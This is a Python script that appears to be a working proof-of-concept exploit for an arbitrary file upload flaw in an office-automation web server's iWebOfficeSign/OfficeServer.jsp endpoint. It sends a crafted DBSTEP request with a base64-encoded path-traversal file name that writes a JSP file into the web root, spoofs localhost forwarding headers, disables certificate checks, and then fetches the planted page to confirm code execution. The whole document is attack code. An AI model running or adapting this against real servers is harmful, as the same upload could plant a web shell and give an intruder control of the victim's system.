import requests,re,urllib3,base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def base64_encoding(string):
    string=base64.b64encode(string.encode())
    return string.decode()
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
s1=randomInt(1000000000, 9000000000)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
s2=randomLowercase(20)
s3=base64_encoding(str("../../public/edit/" + s2 + ".jsp"))
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"defaultroot/public/iWebOfficeSign/OfficeServer.jsp"
	body='''DBSTEP V3.0     185              0                1000              DBSTEP=REJTVEVQ\r
OPTION=U0FWRUZJTEU=\r
RECORDID=\r
isDoc=dHJ1ZQ==\r
moduleType=Z292ZG9jdW1lbnQ=\r
FILETYPE='''+s3+'''\r
111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\r
<% out.println("'''+str(s1)+'''");%>'''
	headers={'x-forwarded-for': '127.0.0.1', 'x-originating-ip': '127.0.0.1', 'x-remote-ip': '127.0.0.1', 'x-remote-addr': '127.0.0.1'}
	response=requests.post(url,body,headers=headers,timeout=30,verify=False)
	if response.status_code == 200 and "DBSTEP" in response.text:
		r0=True
	else:
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"defaultroot/public/edit/"+s2+".jsp"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=30,verify=False)
	if response.status_code == 200 and str(s1) in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
